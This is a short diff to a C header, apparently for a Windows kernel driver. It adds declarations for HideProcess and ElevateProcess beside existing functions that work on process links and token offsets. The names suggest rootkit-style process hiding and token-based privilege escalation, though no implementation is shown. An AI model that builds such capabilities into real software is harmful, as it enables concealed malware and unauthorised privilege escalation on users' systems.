@@ -14,7 +14,9 @@ bool AddProcess(ULONG pid);
 bool RemoveProcess(ULONG pid);
 ULONG GetActiveProcessLinksOffset();
 VOID RemoveProcessLinks(PLIST_ENTRY current);
+NTSTATUS HideProcess(ULONG pid);
 UINT64 GetTokenOffset();
+NTSTATUS ElevateProcess(ULONG targetPid);
 
 /* -------------------------------------------------------------------------------------------------------------------------------------------- */
 
